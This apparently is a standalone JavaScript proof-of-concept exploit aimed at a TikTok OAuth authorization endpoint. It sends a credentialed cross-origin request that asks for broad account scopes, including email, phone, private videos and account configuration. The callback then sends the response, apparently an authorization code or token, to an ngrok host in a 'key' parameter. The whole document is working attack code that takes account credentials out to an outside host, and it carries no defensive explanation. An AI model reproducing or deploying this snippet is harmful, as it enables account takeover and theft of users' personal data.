var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.phone%2Cvideo.list.manage%2Ccomment.list%2Clive.list%2Cvideo.list.private_ads.no_watermark%2Cuser.account.configure%2Cuser.info.showcase%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list.manage&aid=1459&source=web&redirect_uri=https%3a%2f%2fads.tiktok.com%2fblablablabla&state=64588d019065e001fa8e7abdd884581c10770400");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
